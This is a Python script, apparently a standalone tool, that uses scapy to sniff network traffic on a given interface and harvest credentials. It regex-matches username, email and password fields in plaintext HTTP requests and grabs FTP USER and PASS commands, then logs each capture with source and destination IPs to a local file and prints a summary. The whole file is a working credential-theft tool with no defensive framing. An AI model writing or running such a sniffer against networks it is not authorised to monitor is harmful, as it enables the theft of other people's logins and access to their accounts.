import scapy.all as scapy
import argparse
from scapy.layers import http
from scapy.layers.inet import TCP
import time
import re
from datetime import datetime

LOG_FILE = "credentials_log.txt"

def get_interface():
    parser = argparse.ArgumentParser(description="Packet Sniffer")
    parser.add_argument("-i", "--interface", required=True, help="Network interface to sniff on")
    parser.add_argument("-t", "--time", type=int, default=0, help="Duration to sniff (seconds)")
    parser.add_argument("-c", "--count", type=int, default=0, help="Number of packets to sniff")
    args = parser.parse_args()
    return args.interface, args.time, args.count

def log_credential(creds):
    with open(LOG_FILE, "a") as f:
        f.write(f"{creds}\n")

def process_packet(packet):
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
    if packet.haslayer(http.HTTPRequest):
        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load.decode(errors='ignore')
            user_fields = re.findall(r"(username|user|email)=([^&\s]+)", load, re.I)
            pass_fields = re.findall(r"(password|pass|pwd)=([^&\s]+)", load, re.I)
            if user_fields or pass_fields:
                creds = {
                    'protocol': 'HTTP',
                    'src': packet[scapy.IP].src,
                    'dst': packet[scapy.IP].dst,
                    'timestamp': timestamp,
                    'fields': user_fields + pass_fields
                }
                log_credential(creds)
                print(f"[HTTP] Credentials Detected: {creds}")
    # FTP (port 21, TCP)
    elif packet.haslayer(TCP) and (packet[TCP].dport == 21 or packet[TCP].sport == 21):
        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load.decode(errors='ignore')
            if "USER" in load or "PASS" in load:
                parts = load.strip().split()
                creds = {
                    'protocol': 'FTP',
                    'src': packet[scapy.IP].src,
                    'dst': packet[scapy.IP].dst,
                    'timestamp': timestamp,
                    'fields': [tuple(parts[:2])]
                }
                log_credential(creds)
                print(f"[FTP] Credentials Detected: {creds}")

def main():
    iface, duration, count = get_interface()
    print(f"Sniffing on {iface}... (duration: {duration}s, count: {count})")
    try:
        scapy.sniff(iface=iface, store=False, prn=process_packet, timeout=duration or None, count=count or None)
    except PermissionError:
        print("[!] Permission denied. Run as root/administrator.")
    except Exception as e:
        print(f"[!] Error: {e}")

    # Print summary
    try:
        with open(LOG_FILE, "r") as f:
            lines = f.readlines()
            print(f"\n[SUMMARY] Credentials detected ({len(lines)}):")
            for line in lines:
                print(line.strip())
    except FileNotFoundError:
        print("[SUMMARY] No credentials detected.")

if __name__ == "__main__":
    main()
